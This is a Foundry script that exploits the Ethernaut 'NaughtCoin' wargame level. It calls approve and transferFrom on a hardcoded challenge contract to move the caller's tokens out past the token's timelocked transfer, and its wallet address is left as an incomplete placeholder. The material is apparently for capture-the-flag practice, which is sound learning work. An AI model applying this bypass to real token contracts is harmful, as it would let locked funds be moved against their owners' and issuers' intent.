// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/15_NaughtCoin.sol";

contract ExploitScript is Script {

    NaughtCoin level15 = NaughtCoin(payable(0xbB07F83c0611BE77F7B7cf1E1bb9cBa564F2F9B7));
    address wallet = 0x; // wallet address

    function run() external {
        vm.startBroadcast();

        // level15.balanceOf(wallet);
        level15.approve(wallet, level15.balanceOf(wallet));
        level15.transferFrom(wallet, address(level15), level15.balanceOf(wallet));
        // level15.balanceOf(wallet);

        vm.stopBroadcast();
    }
}